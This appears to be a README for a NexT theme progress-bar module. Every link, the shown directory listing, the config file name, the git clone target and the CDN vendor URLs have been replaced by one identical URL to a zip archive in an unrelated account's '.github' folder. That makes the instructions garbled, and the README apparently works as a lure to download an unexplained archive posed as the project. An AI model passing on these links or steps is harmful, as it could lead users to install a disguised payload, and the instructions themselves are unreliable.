<h1 align="center"><a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">Progress bar</a> for <a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">NexT</a></h1>

<h1 align="center">Installation</h1>

<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>

<h2 align="center">Step 1 &rarr; Go to NexT dir</h2>

Change dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:

```sh
$ cd themes/next
$ ls
https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  docs  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  languages  layout  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  scripts  source
```

<h2 align="center">Step 2 &rarr; Get module</h2>

Install module to `source/lib` directory:

```sh
$ git clone https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip source/lib/pace
```

<h2 align="center">Step 3 &rarr; Set it up</h2>

Enable module in **NexT** `https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip` file and select your theme:

```yml
pace:
  enable: true
  # Themes list:
  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple
  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal
  theme: minimal
```

**And, if you wants to use the CDN, then need to set:** (you also need to find your corresponding theme css link in <a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">jsdelivr</a>)

```yml
vendors:
  ...
  pace: https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip
  pace_css: https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip
```

<h1 align="center">Update</h1>

```sh
$ cd themes/next/source/lib/pace
$ git pull
```
